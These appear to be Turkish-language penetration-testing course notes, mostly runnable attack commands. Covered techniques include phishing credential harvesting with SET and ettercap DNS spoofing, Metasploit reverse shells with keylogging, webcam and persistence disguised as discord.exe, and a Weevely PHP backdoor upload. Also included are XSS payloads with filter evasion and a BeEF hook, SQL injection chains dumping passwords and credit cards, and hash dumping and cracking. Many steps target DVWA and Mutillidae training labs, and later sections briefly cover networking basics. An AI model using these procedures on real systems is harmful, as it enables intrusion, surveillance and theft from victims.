![](https://github.com/ahmetnuysal/Cyber-Security/blob/7ec00a9a3d469ba29d8feaccfb0d40c1d9ef2d86/WhatsApp%20Image%202022-08-28%20at%2015.02.57.jpeg)

### Credential Harvester Attack Method

![](https://github.com/ahmetnuysal/Cyber-Security/blob/71d6c4090d56fa3eb5d9f81b99c9a645429400da/WhatsApp%20Image%202022-08-28%20at%2015.05.24.jpeg)

1: Hazır Web Templateslar
2: Web Sitesi Klonlama
3: Custom Kendi Html Adresimiz

### Web Templates

6. Bizden yanıtların yollayacağı IP adresini istiyor
7. ```./ngrok http 80``` çalıştırıp http adresine bakıyoruz
8. ```ping XXX.XXX.XXX.XXX``` ngrok steimizin IP adresini öğreniyoruz (XXX.XXX.XXX.XXX: http adresi)
9. Öğrendiğimiz IP adresini ```setoolkit```'e yazıyoruz, arayüz seçip çalıştırıyoruz

# 17-Hackledikten Sonra

1. ```msfconsole```
2. ```use exploit/multi/handler```
3. ```set PAYLOAD windows/meterpreter/reverse_http``` (trojan hhtp uzantıı olduğu için http, tcp uzantılı olsaydı ```reverse_tcp``` olucaktı
4. ```lhost 192.168.123.456``` (Kali IP'miz)
5. ```lport 8080```
6. ```exploit -j -z```
7. ```sessions -l```
8. ```session -1```

### Hedef PC'ye Sızdıktan Sonra Kullanılabilecek Komutlar
```
background: Session'dan Çıkar
sysinfo: Bilgisayarın Temel Bilgilerini Gösterir
webcam_stream: Hedef PC'nin Kamerasını Açar
ps: Hedef PC'de Çalışan Programları ve Program ID'lerini Gösterir
migrate 2824: Trojan'i 2824 (explorer.exe) içine saklar (2824 değişebilir, neyin içine saklamak istiyorsan onun ID'sini yazarız)
upload dosyaadı: Hedef PC'nin İçine Dosya Yüklememizi Sağlar
download dosyaadı: Hedef PC'nin İçindeki Dosyayı Kali'ye İndirir
keyscan_start: Hedef PC'de Basılan Tuşları Kaydetmeye Başlar
keyscan_dump: Hedef PC'de Basılan Tuşları Gösterir
screenshot: Hedef PC'nin Ekran Görüntüsünü Alır
```

# Hedef PC'yi Hackledikten Sonra Bağlantıyı Sürdürebilir Hale Getirmek

1. ```msfconsole```
2. ```use exploit/windows/local/persistence```
3. ```show options```
4. ```delay 10``` Hedef PC Tekrar Açıldıktan Kaç Saniye Sonra Session'un Açılcağını Belirleriz
5. ```exe_name discord.exe```  Hedef PC'nin Servis Listesinde Görünecek İsim (e.g. discord.exe)
6. ```show advanced```
7. ```set exe::custom /var/www/html/backdoors/tcp backdoor.exe``` Trojan'in Bulunduğu Konum
8. ```exploit```

# 18-Shodan 

Shodan Bilgi Toplama ve Arama Motoru'dur

1. Google'dan ```shodan.io``` adresine giriyoruz
2. ```webcams``` yazarak daha önceden taglanmiş kameraları görebiliriz 
3. ```vsat``` yazarak daha önceden taglanmiş uyduları görebiliriz
4. Çıkan IP'lere tıklayarak kullanılan portları görebiliriz ```(e.g. 123.456.789.123:9000) 9000 portunu kullanıyor```

### Shodan İçerisinde Filtreleme 

* ```vsat port:80```: Port 80 çalıştıran web'e çıkış veren uyduları gösterir
* ```port:22```: SSH Kullanan Servisleri Listeleriz
* ```port:22 country:"FR" city:"Paris"```: Fransa Parisdeki SSH Sunucularını Listeler
* ```os:"Windows XP"```: Windows XP kullanan PC'leri Listeler
* ```os:"Windows XP" country:"US"```: ABD'de Windows XP kullanan PC'leri Listeler
* ```vsftpd 2.3.4```: ftp 2.3.4 Kullanan Servisleri Gösterir

### Shodanı Terminal Üzerinden Çalıştırmak

1. ```shodan```
2. ```shodan init <API key>``` (IP key shodan sitesinde hesabımıza tanımlanmış key)
3. ```shodan host 123.456.789.123``` (Arama yapmak istediğimiz sunucu vs. IP'si)

# 19-Bilgi Toplama

### Maltego

* Arama yapmak istediğimiz şeyi seçip isimini yazarak arama yapabiliriz
* Arama sonucuna göre örneğin ```wordpress``` kullanıyorsa ```wordpress exploit``` google'layarak bilinen açıkları ve nasıl kullanıcağını görebiliriz

### Netcraft

* Netcraft'ın sitesine giderek bilgi toplayabiliriz
* Webtrackerları, kullanılan teknolojileri(php,xml vs.), risk değelerini vs görebiliriz
* HTTP mi yoksa HTTPS mi öğrenebiliriz

### Yougetsignal

* Youtgetsignal aynı IP adresini kullanan websitelerini gösterir (Reverse IP)
* ```Reverse IP: Web sitesinden IP adresinde değil, IP adresinden Websitesine gidiş```
* Aynı IP adresinde çalışan başka bir websitesini hackleyerek diğer websitesinin bilgilerine erişebiliriz
* Bundan korunmak için kendimize ait bir serverimizin bulunması lazım
* ```ip:123.456.789.123 (IP adresi)``` şeklinde aratarak o websitesiyle aynı IP adresini kullanan siteleri buluruz

### Archive 

* Websitelerinin eski hallerini arşivleyen sitedir

### Whoislookup 

* (I CANN WHO IS)
* Temel bilgileri (Register bilgileri, contact numaraları vb.) görebiliriz 
* Ne zaman ve nereden alındığını görebiliriz

### Robots.txt 

* ```dirb http(s)://<IP>/``` yazarak websitesi içine gizlenmiş dosyaları listeleriz(e.g. http://<IP>/multilliade/)
* Liste içierisinde  (e.g. http://<IP>/multilliade/robots.txt) linkini google'da aratarak robots içindekileri görürüz
* ```robots.txt``` içindeki komutları link sonuna ekleyerek istediğimiz gizli uzantılara girebiliriz(e.g. http://<IP>/mutillidae/passwords/)

### Subbrute 

* ```git clone https://github.com/TheRook/subbrute``` çalıştırıp kaydettiğimiz klasöre gidiyoruz
* ```python3 subbrute.py siteadı.com``` diyerek belirtilen sitenin subdomainlerini(alt domain) görebiliriz
* Çıkan subdomainlere giderek ```SQL enjeksiyon``` deneyebiliriz
* Çıkan subdomainlere ```nmap``` çalıştırabiliriz

# 20-Web Pentesting
  
### DVWA 

* metasploitable2 IP adresini Kali üzerinden açıyoruz (Username:admin Password:password)

![](https://github.com/ahmetnuysal/Cyber-Security/blob/e4dd237223d366719e2b6bb6e3e10232ab630e4d/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-29%20at%2014.31.46.jpeg)

* Command execution kısmına giriyoruz, bu kısımdan siteye form yollayabiliriyoruz
* IP adresimizin sonunda Linux komutları çalıştırmayı deniyoruz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/42e3c1f9c825f1c1462ccc16069e42bc305cf071/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-29%20at%2014.35.42.jpeg)

* Komutu çalıştırabildik                                                

![](https://github.com/ahmetnuysal/Cyber-Security/blob/dfd38c27ffc53942cfde3fcca7d8f7011bdcdb3e/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-29%20at%2014.39.14.jpeg)

* Google'a ```reverseshell commens``` yazarak komutları arıyoruz
* Bulduğumuz komutları IP'mizin sonuna ekleyerek çalıştırıyoruz
* Aynı zamanda ```msfconsole``` çalıştırarak dinlemeye başlıyoruz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/1e6067bcbb08a3c6085b8b4bb1da5cdaf0fa6ea3/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-29%20at%2014.42.00.jpeg)

### NATCAT ile Dinleme

```nc -vv -l -p 5050``` Natcat ile port dinlemesi yapmamızı sağlar
```connect to 123.123.123.123 from UNKKNOWN...``` bağlanıldı demektir
```
-vv: Detaylı Bilgi Verir
-l: Dinleme Modunu Açar
-p XXXX: Hangi Porttan Dinleyeceğimizi Seçeriz
-e: Dosya Aktarımında Kullanılır
-v: Detay Verir
```  

### Weevely

1. ```.php``` kullanarak backdoor trojan oluşturmamızı sağlar
2. ```weevely generate 11111 /root/myconnection.pnp``` şifremizi ve trojan'in kaydedileceği konumu yazıyoruz
3. Sitemizin upload yapabileceğimiz kısımını açıyoruz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/2ac777e091178628c515e1eb99546fe3aa5ed7d8/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-29%20at%2018.51.59.jpeg)

4. Oluşturduğumuz php dosyasını upload ediyoruz
5. ```weevely http://<IP>/../../uploads/myconneciton.php 11111``` yazarak session içine gireriz ve gezinebiliriz

### File Inclusion

1. Linkde bulunan ```?page=``` kısımını siliyoruz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/34f3233fa792bbc0248640ebbd33a03d40ab5fc0/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-29%20at%2018.56.58%20(1).jpeg)

2. Link'in sonuna ```?page="var/www/dvwa/vulnerabilities/fi/include.php"``` ekliyoruz
3. Link sonundaki ```include.php``` kısımından silmeye başlayarak geri gidebiliriz 
4. Ya da gitmek istediğimiz yeri link sonuna ekleyebiliriz ```e.g. http://123.123.124.123/dvwa/vulnerabilities/fi/?page=/etc/passwrd```

### Nikto 
  
```nikto -h (site URL'si) ``` site ile ilgili tarama yapar  

# 21-XSS
  
XSS açıkları site içinde JS kodu çalıştırabiliyoruz demektir

### XSS Açıkları
  
1. Site ile etkileşime girebileceğimiz bir yere giriyoruz (form vb.)
2. ```<script>alert("XSS Açığı")</script>``` kodunu yazarak deneme yapıyoruz
3. Eğer açık var ise, bu JS kodunu siteye giren herkesin görebileceği bir kısıma yazarsak siteye giren herkesin ekranına bu bildirim düşer
4. ```<script>window.location='https://google.com'</script>``` kodunu yazarsak siteye giren herkesi otomatik olarak belirtilen siteye yönlendirir (bu kod için google'a)
5. Bazı sitelerde ```JavaScript``` filtreleri bulunur, bu filtrelerden kaçmak için ```<scr<script>ipt>alert("XSS Açığı")</scr</script>ipt>``` şeklinde yazarız

### XSS Reflected

Bir link oluşturmamız gerekiyor 

Site içinde site ile etkileşime girebileceğimiz yer arıyoruz 

![](https://github.com/ahmetnuysal/Cyber-Security/blob/b8d58a9d2f710cb023f9ac0dbb2d83c22e457eba/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-30%20at%2013.39.08.jpeg)

Bu kısıma ```<script>alert("ı hack you")</script>``` yazıyoruz ve submit ediyoruz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/f7a0ec1433d1e05fd007503381c54e818cfce8e6/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-30%20at%2013.42.12.jpeg)

Eğer birisine sitenin ```url```sini yollarsak yolladığımız kişininde ekranında bu bildirimi görürüz

### XSS Stored

Bu sefer form siteleri benzeri bir etkileşim yeri buluyoruz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/41454e2cfb3fb9afae9f262e08f50311f927397e/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-30%20at%2014.03.03.jpeg)

Rastgele bir isim giriyoruz, mesaj kısmına ```<script>alert("ı hack you")</script>``` yazıyoruz ve submit ediyoruz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/9991c76b35828899d62e508174455d796dc28ba0/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-30%20at%2014.05.40.jpeg)

Mesajımızı siteye giren herkes göreceği için bu sayfaya giren herkesin ekranında ```ı hack you``` mesajı görülecek

![](https://github.com/ahmetnuysal/Cyber-Security/blob/f7a0ec1433d1e05fd007503381c54e818cfce8e6/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-30%20at%2013.42.12.jpeg)

> ### XSS Stored ve Beef Çalıştırma

```beef-xss``` ile beef'i açıyoruz
```example``` kısmınıdaki ```<script src="http://.../hook.js"></script>```kodunu kopyalıyoruz ve sitemize geri dönüyoruz
Bu kodu mesaj kısımına yapıştırıp submit ediyoruz
Artık bu siteye giren herkes hook'umuza takılmış olucak ve ```beef``` üzerinden bize görünür olucak

### XSS'den Korunmak İçin
 
Google -> Ayarlar -> Gizlilik ve Güvenlik -> Site Ayarları -> JavaScript 

Varsayılan durumunu kapatıp sadece güvendiğimiz siteleri listeye eklemeliyiz

# 22-SQL

[sqliteonline.com](https://sqliteonline.com/) sitesinden SQL kodlarını deneyebiliriz
  
### SQL Kodları

```INSERT INTO demo (id,name,hint) VALUES (18,"james","Guitar");``` Veri tabanına veri eklememizi sağlar
```DELETE FROM demo WHERE name="james":```: Veri tabanında ```james``` isimine kayıt edilmiş verileri siler
```UPDATE demo SET id=22 WHERE name="james";```: Veri tabanına ```james``` isimiyle kayıt olan kişini id'sini 22 olarak günceller
```SELECT*FROM demo WHERE name LIKE "A%";```: Veri tabanında ```A``` ile başlayan verileri listeler
```SELECT*FROM demo WHERE name LIKE "%A";```: Veri tabanında ```A``` ile biten verileri listeler

### SQL ile Database Görme

1.```mysql -u root -h 123.123.123.123``` 
2.``` show databases;```

![](https://github.com/ahmetnuysal/Cyber-Security/blob/3611d2c9af41e40728e0e69b001efc143b37d52a/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-30%20at%2016.52.49.jpeg)

3.```use xxx;``` Hangi veri tabanını kullanıcağımızı seçiyoruz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/b6e35c92d6127f1862bc60b32309d523776a4295/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-30%20at%2016.57.51.jpeg)

4. Veri tabanına girdikten sonra
5.```select*from xxx;``` Tablo İçeriğini görürüz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/7b48c658a89095e242d16d571db0785781f315d1/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-30%20at%2016.57.57%20(1).jpeg)

### Mutillidae İçine SQL Hatası

Mutillidae içine girip create account yapıyoruz ve hata alıyoruz, bu hatayı düzeltmek için
* 1. Metasploitable makinemize giriyoruz
* 2. ```sudo nano /var/www/mutullidae/config.ınc``` çalıştırıyoruz
* 3. Çıkan kodlar içinden ```$dbname=`metasploitable`;``` yerine ```$dbname=`mowasp10`;``` yazıyoruz

### SQL Açığı Arama

Sitemizin login kısmına giriyoruz
Kullanıcı adımızı yazıp şifre yerine ```'``` koyup çalıştırıyoruz
Çıkan hata mesajındaki SQL kodunu not alıyoruz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/11eef15c44bffa70db5dcd339eb1968b8748ae8b/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-31%20at%2011.52.22.jpeg)

Önemli olan kısım

![](https://github.com/ahmetnuysal/Cyber-Security/blob/d96977bfdb90640b867c91d1a21d5aee92d9b78b/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-31%20at%2011.56.38.jpeg)

Kullanıcı adımızı yazıp şifre yerine ```şifremiz' AND 1=2#``` yazıyoruz ve şifremiz doğru olmasına rağmen giriş yapamıyoruz
Bu sefer Kullanıcı adımızı yazıp  şifre yerine ```şifremiz' AND 1=1#``` yazıyoruz ve giriş yapabiliyoruz

### SQL Post Methodu

> ## 1. Yöntem

```SELECT*FROM accounts WHERE username='admin' AND password='1' OR 1=1#'``` deniyoruz
Kullanıcı adı:```admin``` , Şifre:```1' OR 1=1#``` 

> ## 2. Yöntem

```SELECT*FROM accounts WHERE username=admin'# AND password='rastgeleşifre'``` deniyoruz
Kullanıcı adı:```admin'#``` , Şifre:```herhangibirşifre```

### SQL Get Methodu

1. Siteye giriş yaptıktan sonra ```URL```'yi dğeiştirerek giriş yapmayı deniyoruz
2. ```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=james&password=123456&user-info-php-submit-button=View+Account+Details```
3. ```URL```nin ```&username=admin'%23&``` olarak değiştiriyoruz 

```%23``` html'de ```#``` anlamına geliyor

### SQL Union Select Kodu

1. Admin kullanıcı adını bilmiyorsak veya tüm kullanıcı isimlerini öğrenmek istiyorsak ```union select``` kullanabiliriz
2. URL kısmına ```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=admin' union select*from account%23&password=123456&user-info-php-submit-button=View+Account+Details``` yazıyoruz 
###

### SQL Get ile Veri Tabanı İsmini Öğrenme

1. URL'kısmına ```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=admin' order by1%23&password=123456&user-info-php-submit-button=View+Account+Details``` yazıyoruz
2. ```order by 2``` diyerek tek tek deniyoruz ve kaç sütun olduğunu öğreniyoruz
3. Kaç sütun olduğunu anlatıktan sonra (varsayalım 5 sütun var)
4. ```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=admin' union select 1, 2, 3, 4, 5%23&password=123456&user-info-php-submit-button=View+Account+Details``` yazarak o sütundaki değerleri bastırıyoruz
5. ```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=admin' union select 1, database(), user(), version(),5%23&password=123456&user-info-php-submit-button=View+Account+Details``` yazıyoruz
6. Veritabanı ismini, kullanıcı adını ve linux versiyonunu öğreniyoruz

### 2-SQL Get ile Veri Tabanındaki Table Name Bulma

1. ```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=admin' union select 1, table_name, null, null,5%23&password=123456&user-info-php-submit-button=View+Account+Details``` yazıyoruz
2. Bu şekilde tüm table'lları görürüz (sadece owasp10 değil)
3. Belirli bir veritabanındaki table'lları görmek için ```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=admin' union select 1, table_name, null, null, null,5 from information_schema.tables where table_schema='<veritabanıadı>%23&password=123456&user-info-php-submit-button=View+Account+Details``` 

### SQL Get ile Veri Tabanındaki Sütun Name Bulma

1. ```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=admin' union select 1, column_name, null, null,5 from information_schema.columns where table_name='<tabloismi>'%23&password=123456&user-info-php-submit-button=View+Account+Details```
2. Belirtilen tablodaki sütunları gösterir

### SQL Get ile Admin Bilgilerini Öğrenme

1.```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=admin' union select 1, username, password, is_admin,5 from account%23&password=123456&user-info-php-submit-button=View+Account+Details```

2. Admin kullanıcı adlarını ve şifrelerini görürüz

### SQL Map 

```URL``` adresini verdiğimiz sitede SQL açığı var mı test eder

1.``` sqlmap -u "http://123.123.123.123/mutillidae/index.php?&username=admin&password=123123&user-info-php-submit-button=View+Account+Details"```
2. Bize eğer ```Get parameter 'username' is vulnerable. Do you want to keep testing the others (if any) Y/N``` derse "açık bulundu teste devam edeyim mi?" diye soruyordur

![](https://github.com/ahmetnuysal/Cyber-Security/blob/bf3a19821795b78ca5fed16e82ad334859214ecc/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-31%20at%2017.40.21.jpeg)

3. ```sqlmap -u "http://123.123.123.123/mutillidae/index.php?page=user-info.php&username=admin&password=1231231&user-info-php-submit-button=View+Account+Details" --current-db``` Güncel database'leri verir

![](https://github.com/ahmetnuysal/Cyber-Security/blob/c5a212ed129be0d8418261b677042d9c5e504e6d/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-31%20at%2017.47.09.jpeg)

4. ```sqlmap -u "http://123.123.123.123/mutillidae/index.php?page=user-info.php&username=admin&password=1231231&user-info-php-submit-button=View+Account+Details" --tables -D owasp10``` owasp10 içindeki tüm table'lları gösterir

![](https://github.com/ahmetnuysal/Cyber-Security/blob/83e78aeb040296afd4cb7b83cab56a7ddc988b92/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-31%20at%2018.29.34.jpeg)

5. ```sqlmap -u "http://123.123.123.123/mutillidae/index.php?page=user-info.php&username=admin&password=1231231&user-info-php-submit-button=View+Account+Details" --columns -T <tableismi> -D <databaseismi>``` Sütunları görmemizi sağlar

![](https://github.com/ahmetnuysal/Cyber-Security/blob/e2b4b92b35c22b60c442741dfc83a30892a2ae9f/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-31%20at%2018.32.11.jpeg)

6. ```sqlmap -u "http://123.123.123.123/mutillidae/index.php?page=user-info.php&username=admin&password=1231231&user-info-php-submit-button=View+Account+Details" -T credit_cards -D owasp10 --dump``` Table içindeki verileri gösterir

![](https://github.com/ahmetnuysal/Cyber-Security/blob/d326716448fe5caa031175c9d6ac65a8dc08b1fb/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-31%20at%2018.34.27.jpeg)

# ZAP Bir Çeşit Açık Bulma Programı 

1. Zap uygulamasını açıyoruz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/d549e2f94633803291d42bc62daf649497e75048/Websitesi%20Pentesting/Pict/zap.jpeg)

2. ```Scan Policy Manager``` kısımından ```XSS'mi yoksa SQL'mi``` seçebiliriz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/d549e2f94633803291d42bc62daf649497e75048/Websitesi%20Pentesting/Pict/scan%20policy.jpeg)

3. Sitenin URL'sini yapıştırıp ```active scan'i ekliyoruz (sol altta bulunan yeşil artıdan)``` ve attack diyoruz
4. ```Alert``` kısımından açık türlerini görebiliriz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/d549e2f94633803291d42bc62daf649497e75048/Websitesi%20Pentesting/Pict/alerts.jpeg)

5. Açığa tıklayıp ```response``` seçersek o açığı ele geçirmek için gerekli teknik bilgileri görebiliriz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/d549e2f94633803291d42bc62daf649497e75048/Websitesi%20Pentesting/Pict/response.jpeg)

6. ```Alert``` kısımındaki açığa sağ tıklayarak o sayfaya gidebiliriz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/d549e2f94633803291d42bc62daf649497e75048/Websitesi%20Pentesting/Pict/open%20url.jpeg)

7. ```Kırmızı bayrak``` yüksek riskli, ```Sarı bayrak``` düşük riskli demektir

### SQL Enjeksiyonu

1. Sitenin URL'sinde ```...?id=1``` varsa URL'ye ```...?#id=1 OR 1=1``` çalıştırmayı deniyoruz, eğer aynı site çıkıyorsa doğru yoldayız demektir
2. ```...?id=1 OR 1=1 order by 9``` deneyerek kaç sütun olduğunu anlamaya çalışıyoruz. 9 yerine başka sayılar koyup tek tek deniyoruz
3. Örneğin 11 sütun var. ```...?id=1 OR 1=1 union select 1,2,3,4,5,6,7,8,9,10,11``` yazıyoruz
4. Sayfa içinde bir yerde bozukluk buluyoruz. Örneğin 2. sütunda bozukluk var.
5. ```...?id=1 OR 1=1 unioun select 1,database(),3,4,5,6,7,8,9,10,11``` yazarak bozukluk olan yerden ```veritabanı ismini``` öğrenebiliriz
6. ```...?id=1 OR 1=1 union select 1,group_concat(table_name),3,4,5,6,7,8,9,10,11 from information_schema.tables where table_schema=database()``` yazarak tablo isimini öğrenebiliriz
7. ```...?id=1 OR 1=1 union select 1,group_concat(column_name),3,4,5,6,7,8,9,10,11 from information_schema.columns where table_name=0x7573657273(users tablosunun hex hali)``` isimleri hex'e çevirmek için google'a ```text to hex``` yazabiliriz
8. ```...?id=1 OR 1=1 union select 1,group_concat(unme,0x3a,pass),3,4,5,6,7,8,9,10,11 from users``` kullanıcı isimlerini ve şifreleri öğrenebiliriz (0x3a kullanıcı adı ve şifre arasına ":" koyar)

### Login By-Pass

1. Login kısımının URL adresinde SQL açığı varsa 

| Kullanıcı Adı | ' or "=" |
| --- | --- |
| Şifre | ' or "=" | 

# Hashes
  
### Linux Hashes

> ### MD5
```root:$1$/aupf...:0:0:root:/root:/bin/bash``` 
* ```$ 1 $``` ile başlıyorsa MD5 kullanılarak şifrelenmiş demektir

> ### SHA512
```root:$6$MUwe5...:0:0:root:/root:/bin/bash```
* ```$ 6 $``` ile başlıyorsa SHA512 kullanılarak şifrelenmiş demektir

### Windows Hashes

```admin:500:B34CE...A1:ABC123ABC12:::```
* ```admin```: Kullanıcı Adı
* ```500```: Kullanıcı Grubu (500: Admin Grubu)
* ```B34C3...A1```: LM
* ```ABC123ABC12```: NTLM 
* ```LM```: Şifrede harf varsa o harflerin hepsini büyük harfe çeviri eğer 14 karakterden büyükse ilk 14 karakteri alır

! ```NTLM LM'den daha güvenilirdir```

### Sistemi Hackledikten Sonra Hash'leri Öğrenme 

1.```nmap``` çalıştırarak açıkları buluyoruz örneğin ```java_rmi_server``` açığı var
``` 
msfconsole
use exploit/multi/handler/misc/java_rmi_server
show payloads
set payload java/meterpreter/reverse_tcp
show options
set rhost <HedefIP>
exploit
sessions -l
session -1
```
2. Sistemi Hackledikten Sonra 
```hashdump``` Hashleri gösterir
3.  Eğer ```hashdump``` çalışmazsa
```run post/linux(ya da windows)/gather/hashdump```

### Kali Sistemi Hackledikten Sonra Hash Öğrenme

1. ```/``` içindeyken
2. ```cat /etc/passwd``` kullanıcı(kali) şifrelerini gösterir
3. ```cat /etc/shadow``` Kullanıcıların şifrelerinin hashlenmiş halini gösterir
4. ```unshadow /etc/passwd /etc/shadow``` şifre ve hashleri birleştirerek gösterir
  
### HASHCAT

```Hashcat bir çok şifrelenmiş dosya, sistem, kripto cüzdan vb. şeylerin şifrelerini kırmaya yaran framework```

```apt-get install hashcat``` hashcat'i yükler
```hashcat --help``` çalıştırıyoruz ve moduna bakıyoruz ```hashcat --help | grep 512 (SHA512 için)``` diyerek sadece 512'leri listeleyebiliriz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/3e4f0ff428baabc79bff59ab06abbf1a21aebd2c/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-09-01%20at%2013.23.05.jpeg)

! Sistem hash'i kırarken ```operating system``` seçmemiz gerekiyor

> ### Kali Hash Kırma

```hashcat -m 1800 mykalihash.txt /usr/share/wordlist/fasttrack.txt``` 
* ```-m 1800```: $ 6 $ (SHA512) sistemler için mod
* ```-m 500```: $ 1 $ (MD5) sistemler için mod
* ```mykalihash.txt```: Hash'imizi kaydettiğimiz dosya
* ```/usr/share/wordlist/fasttrack.txt```: Wordlistimiz

> ### Metasploitable Hash Kırma

```hashcat -m 500 mylinuxhash.txt /usr/share/wordlist/fasttrack.txt> # Metasploitable Hash Kırma```

> ### Windows Hash Kırma

```hashcat -m 1000 mywindowshash.txt /usr/share/wordlist/fasttrack.txt```
* ```-m 1000```: NTLM sistemler için mod

> ### Hatalar

1. ```All hashes found in potfile``` hatası alırsak, daha önce bu hash kırılmış demektir
```hashcat -m 1800 mykalihash.txt /usr/share/wordlist/fasttrack.txt --show``` diyerek daha önceden kırılmış hash sonuçlarını görebiliriz
2. ```Not enough allocatable device memory for this attack``` hatası alırsak, RAM'imiz yetersiz demektir 4GB RAM yeterli olacaktır
3. ```Appraching final keyspace workload adjusted``` hatası alırsak, hash kırılamadı demektir

# 24-Zip Şifrelerini Kırma

### John 

1.``` apt get install john``` john'u yüklüyoruz
2. Zip'in bulunduğu klasöre gidiyoruz ve ```zip2john mysecretfiles.zip``` zip dosyasının hash'ini verir
3. ```zip2john mysecretfiles.zip | cut -d ':' -f 2``` diyerek ```:```'ye göre ayırıp 2. kısımını (işimize yarayan kısım) alıyoruz
4. ```zip2john mysecretfiles.zip | cut -d ':' -f 2 > ziphashes.txt``` hash'i ziphashes.txt dosyasına kaydeder
5. ```hashcat -m 13600 myzip.txt /usr/share/wordlist/fasttrack.txt``` 

![](https://github.com/ahmetnuysal/Cyber-Security/blob/000f66c5a107ca48ba223ed0c38bdd49c361bb0b/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-09-01%20at%2013.43.17.jpeg)

# 25-OSI Modelleri
  
OSI (Open System Interconnection). OSI toplam 7 katmandan oluşur

![](https://github.com/ahmetnuysal/Cyber-Security/blob/11181d91a94c0ad017d38ca915297e832e6a5591/Websitesi%20Pentesting/Pict/PreviewImage_OSI-model.jpg)

# 26-IPv4 ve IPv6

* Şu an aktif olarak ```IPv4``` kullanıyoruz fakat çok fazla cihaz olmaya başladığı için ```IPv6```'ya geçiş yapılacak
* ```IPv4``` kullanarak 2³² değer bulabiliriz
* ```IPv6``` kullanarak ise 2¹²⁸ değer buluruz

# 27-NAT

|   Class Name  | Network Numbers |  Network Mask |    # of Hosts   |
| ------------- | --------------- | ------------- | --------------- |
| Class A  | 10.0.0.0   | 255.0.0.0  | 16777214   |
| Class B | 172.16.0.0    | 255.255.0.0  | 65534   |
| Class C | 192.168.0.0    | 255.255.255.0  | 254   |
| Loopback (local) | 127.0.0.0    | 255.255.255.0  |     |

* ! 255 olan kısımlar değiştirilemez sadece 0 olan kısımlar değişebilir

* ```# of Host``` total olabilecek host sayısı - 2'dir. Çünkü 1 IP modeme ve son IP broadcast'e gider. Öğneğin Class C'de 256 tane host olabilir fakat # of hosts 254 dür. (256-2)
  
# 28-TCP ve UDP
  
### TCP ve UDP Farkları

* ```TCP``` daha düzgün veri aktarımında kullanılır (Bağlantı açma, web sitesine girme, mail alış-verişi)
* ```UDP``` daha hızlı veri aktarımında kullanılır (Video yayını)

### Kullanılan Portlar

| **TCP**  | **UDP** |
| ------------- | ------------- |
| FTP (21)  | DHCP (67)  |
| SSH (22) | SVMP (161)  |
| TELNET (23)  |  |
| SMTP (25) |  |
| HTTP (80)  | |
| HTTPS (443) |   |
| POP3 (110) |  |
| IMAP (443) |   |

### TCP İletişim Kurma Aşamaları

![](https://study-ccna.com/wp-content/uploads/2018/09/tcp_three_way_handshake.png)

* ```SYN```: Olayı başlatan, selam veren
* ```SYN ACK```: Selamı alan
* ```ACK```: Muhabbete başlayan


# 29-Web Sitesi Klonlama

> ### 1.Bazı Ayarları Değiştiriyoruz

1. ```locate etter.conf``` ettercap'in conf dosyalarının yerini görürüz
2. ```leafpad /etc/ettercap/etter.conf``` ettercap'i açarız (etter.conf konumu değişebilir)
3. ``` ec_vid=0 ve ec_gid=0``` olarak değiştiriyoruz
4. ```locate etter.dns``` ettercap'in dns dosyalarının bulunduğu yeri görürüz
5. ```leafpad /etc/ettercap/etter.dns``` açıyoruz
6. Klonlamak istediğimiz web sitesine girip IP kısmına ```kendi IP``` adresimizi giriyoruz 

> ### 2.SETOOLKIT Açıyoruz

1. ```Social-Enginnering Attack``` seçiyoruz
2. ```Website Attack Vectors``` seçiyoruz
3. ```Credetial Harvester Attack Method``` seçiyoruz
4. ```Site Cloner``` seçiyoruz
5. ```Kendi IP```'mizi giriyoruz
6. Sitenin adını yazıyoruz 

> ### 3.EtterCap'i Açıyoruz

1. ```target 1 ve target 2```'yi ekliyoruz
2. ```MITM ARP``` seçiyoruz
3. ```sniff remote.com.```seçiyoruz
4. ```Pluging``` içinden ```dns_spoof``` aktif ediyoruz
5. ```Setoolkit``` üzerinden dinliyoruz

